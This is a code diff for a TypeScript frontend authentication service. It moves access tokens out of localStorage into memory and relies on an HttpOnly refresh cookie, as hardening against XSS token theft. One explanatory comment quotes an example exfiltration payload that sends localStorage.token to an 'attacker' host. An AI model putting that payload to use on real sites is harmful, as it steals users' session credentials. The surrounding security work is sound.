@@ -1,4 +1,4 @@
-import api from './api';
+import api, { _registerAccessTokenSource, _registerTokenLifecycle } from './api';
 
 export interface LoginCredentials {
   email: string;
@@ -25,19 +25,50 @@ export interface AuthUser {
 
 export interface AuthResponse {
   accessToken: string;
-  refreshToken: string;
-  refreshExpiresAt: string;
+  refreshToken?: string;
+  refreshExpiresAt?: string;
   user: AuthUser;
 }
 
-const TOKEN_KEY = 'control_plane_token';
-const REFRESH_KEY = 'control_plane_refresh';
 const USER_KEY = 'control_plane_user';
+// Legacy keys that may still exist in localStorage from the pre-W1
+// build. We clear them on every auth event to make sure no XSS payload
+// can read a leftover token after the user logs in or refreshes a tab.
+const LEGACY_TOKEN_KEY = 'control_plane_token';
+const LEGACY_REFRESH_KEY = 'control_plane_refresh';
+
+// F089 (W1 task 10): the access token lives in this module-scoped
+// variable, NOT in localStorage. XSS payloads that target localStorage
+// (the standard exfil pattern: `fetch('//attacker/?'+localStorage.token)`)
+// no longer find anything. The refresh token is set as an HttpOnly
+// cookie by the backend (F089 backend half) and is never visible to
+// JS.
+let inMemoryAccessToken: string | null = null;
+
+function setAccessToken(token: string | null): void {
+  inMemoryAccessToken = token;
+  // Belt-and-suspenders: scrub legacy keys on every set so a partial
+  // upgrade can't leave a token at HEAD.
+  scrubLegacyTokens();
+}
+
+function scrubLegacyTokens(): void {
+  try {
+    localStorage.removeItem(LEGACY_TOKEN_KEY);
+    localStorage.removeItem(LEGACY_REFRESH_KEY);
+  } catch {
+    // tolerated — localStorage may be disabled
+  }
+}
 
 function clearLocalAuth(): void {
-  localStorage.removeItem(TOKEN_KEY);
-  localStorage.removeItem(REFRESH_KEY);
-  localStorage.removeItem(USER_KEY);
+  inMemoryAccessToken = null;
+  scrubLegacyTokens();
+  try {
+    localStorage.removeItem(USER_KEY);
+  } catch {
+    // tolerated
+  }
 }
 
 function isAuthUser(value: unknown): value is AuthUser {
@@ -53,46 +84,64 @@ function isAuthUser(value: unknown): value is AuthUser {
   );
 }
 
+// Wire the in-memory token to api.ts's interceptor + refresh flow.
+// auth.ts owns the variable; api.ts reads it through these getters/
+// setters. Registered at module init so the interceptor sees the right
+// state from the first request onwards.
+_registerAccessTokenSource(() => inMemoryAccessToken);
+_registerTokenLifecycle(
+  (token) => setAccessToken(token),
+  () => clearLocalAuth(),
+);
+
 export const authService = {
   async login(credentials: LoginCredentials): Promise<AuthResponse> {
     const response = await api.post<AuthResponse>('/auth/login', credentials);
-    const { accessToken, refreshToken, user } = response.data;
+    const { accessToken, user } = response.data;
 
-    // Store tokens and user
-    localStorage.setItem(TOKEN_KEY, accessToken);
-    if (refreshToken) localStorage.setItem(REFRESH_KEY, refreshToken);
-    localStorage.setItem(USER_KEY, JSON.stringify(user));
+    // F089: access token in memory. Refresh token arrives via Set-Cookie
+    // header set by the backend (HttpOnly, SameSite=Strict, Secure on
+    // https); the frontend never sees it. We persist `user` in
+    // localStorage because it's not a credential and the AuthContext
+    // restores it on tab reload — but the access token is gone after
+    // any reload, so a reload always re-authenticates (silent refresh
+    // via the cookie if still valid; otherwise redirect to login).
+    setAccessToken(accessToken);
+    try {
+      localStorage.setItem(USER_KEY, JSON.stringify(user));
+    } catch {
+      // tolerated
+    }
 
     return response.data;
   },
 
   /**
-   * Exchange the stored refresh token for a fresh access+refresh pair.
-   * Throws if no refresh token is stored or the server rejects it. The
-   * 401 interceptor in api.ts calls this; on failure it falls back to
-   * clearing local state and redirecting to /login.
+   * Exchange the HttpOnly refresh-token cookie for a fresh access
+   * token. The cookie is sent automatically because api.ts has
+   * withCredentials: true. The 401 interceptor calls this; on failure
+   * it falls back to clearing local state and redirecting to /login.
    */
   async refresh(): Promise<string> {
-    const refreshToken = localStorage.getItem(REFRESH_KEY);
-    if (!refreshToken) {
-      throw new Error('No refresh token available');
-    }
     const response = await api.post<AuthResponse>(
       '/auth/refresh',
-      { refreshToken },
+      // No body — the refresh token is in the HttpOnly cookie. We send
+      // an empty object so the backend's body parser is happy.
+      {},
       // Mark the refresh request itself so the 401 interceptor never
       // recursively tries to refresh the refresh call.
       { headers: { 'X-Skip-Auth-Refresh': 'true' } },
     );
-    const { accessToken, refreshToken: rotated, user } = response.data;
-    localStorage.setItem(TOKEN_KEY, accessToken);
-    if (rotated) localStorage.setItem(REFRESH_KEY, rotated);
-    if (user) localStorage.setItem(USER_KEY, JSON.stringify(user));
+    const { accessToken, user } = response.data;
+    setAccessToken(accessToken);
+    if (user) {
+      try {
+        localStorage.setItem(USER_KEY, JSON.stringify(user));
+      } catch {
+        // tolerated
+      }
+    }
     return accessToken;
-  },
-
-  getRefreshToken(): string | null {
-    return localStorage.getItem(REFRESH_KEY);
   },
 
   clearLocal(): void {
@@ -100,10 +149,11 @@ export const authService = {
   },
 
   // Best-effort server-side logout. The control-plane revokes the access
-  // token's `jti` so a stolen bearer token cannot be replayed. The client
-  // unconditionally clears local state and redirects after the call - if the
-  // network errored the worst case is that the token remains valid until
-  // natural expiry, which is no worse than the prior behaviour.
+  // token's `jti` so a stolen bearer token cannot be replayed AND clears
+  // the HttpOnly refresh-token cookie. The client unconditionally clears
+  // local state and redirects after the call - if the network errored
+  // the worst case is that the token remains valid until natural
+  // expiry, which is no worse than the prior behaviour.
   async logout(): Promise<void> {
     try {
       await api.post('/auth/logout');
@@ -115,11 +165,16 @@ export const authService = {
   },
 
   getToken(): string | null {
-    return localStorage.getItem(TOKEN_KEY);
+    return inMemoryAccessToken;
   },
 
   getUser(): AuthUser | null {
-    const userStr = localStorage.getItem(USER_KEY);
+    let userStr: string | null;
+    try {
+      userStr = localStorage.getItem(USER_KEY);
+    } catch {
+      return null;
+    }
     if (!userStr) return null;
     try {
       const parsed = JSON.parse(userStr);
@@ -140,13 +195,21 @@ export const authService = {
 
   async getProfile(): Promise<AuthUser> {
     const response = await api.get<AuthUser>('/auth/me');
-    localStorage.setItem(USER_KEY, JSON.stringify(response.data));
+    try {
+      localStorage.setItem(USER_KEY, JSON.stringify(response.data));
+    } catch {
+      // tolerated
+    }
     return response.data;
   },
 
   async updateProfile(data: { firstName?: string; lastName?: string; avatarUrl?: string }): Promise<AuthUser> {
     const response = await api.put<AuthUser>('/auth/me', data);
-    localStorage.setItem(USER_KEY, JSON.stringify(response.data));
+    try {
+      localStorage.setItem(USER_KEY, JSON.stringify(response.data));
+    } catch {
+      // tolerated
+    }
     return response.data;
   },
 
